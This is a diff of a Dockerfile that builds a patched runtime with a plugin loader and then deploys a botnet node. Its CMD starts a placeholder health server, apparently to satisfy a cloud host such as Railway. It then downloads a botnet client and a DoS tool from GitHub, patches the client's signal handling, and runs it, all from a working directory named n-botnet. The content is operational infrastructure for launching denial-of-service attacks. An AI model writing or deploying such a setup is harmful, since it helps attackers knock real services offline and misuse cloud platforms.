@@ -29,7 +29,6 @@ RUN cd /tmp/manios \
 
 # ============ PATCH mnos_runtime.c ============
 RUN cat > /tmp/nplugin_runtime.c << 'NPRTEOF'
-/* ======== nplugins ======== */
 static void mkdir_p_nplugin(void) {
 char b[1024];
 snprintf(b, sizeof(b), "%s/.manios/nplugin",
@@ -108,7 +107,7 @@ closedir(d);
 }
 NPRTEOF
 
-# Patch mnos_runtime.c — append nplugin code at end of file (file is minified, can't use line numbers)
+# Patch mnos_runtime.c
 RUN cd /tmp/manios \
     && sed -i '1i#include <dlfcn.h>' src/mnos_runtime.c \
     && cat /tmp/nplugin_runtime.c >> src/mnos_runtime.c \
@@ -173,8 +172,10 @@ RUN rm -rf /tmp/manios /tmp/nplugin.c /tmp/nSocks.c /tmp/n-args.c /tmp/nplugin_r
 
 WORKDIR /root/n-botnet
 
-# Health server ($PORT for Railway) + download client + run botnet
+# Download client.py, patch SIGTERM→SIGINT (nDoS catches Ctrl+C, not SIGTERM), then run
 CMD ["bash", "-c", "python3 -m http.server ${PORT:-8080} --directory /tmp &> /dev/null & sleep 1 \
     && wget -q https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/client/client.py \
     && wget -q https://raw.githubusercontent.com/anhnoine/nDoS/refs/heads/main/tools/nDoS.mno \
+    && sed -i 's/signal.SIGTERM/signal.SIGINT/g' client.py \
+    && echo \"[OK] Patched SIGTERM->SIGINT for Ctrl+C support\" \
     && python3 client.py"]
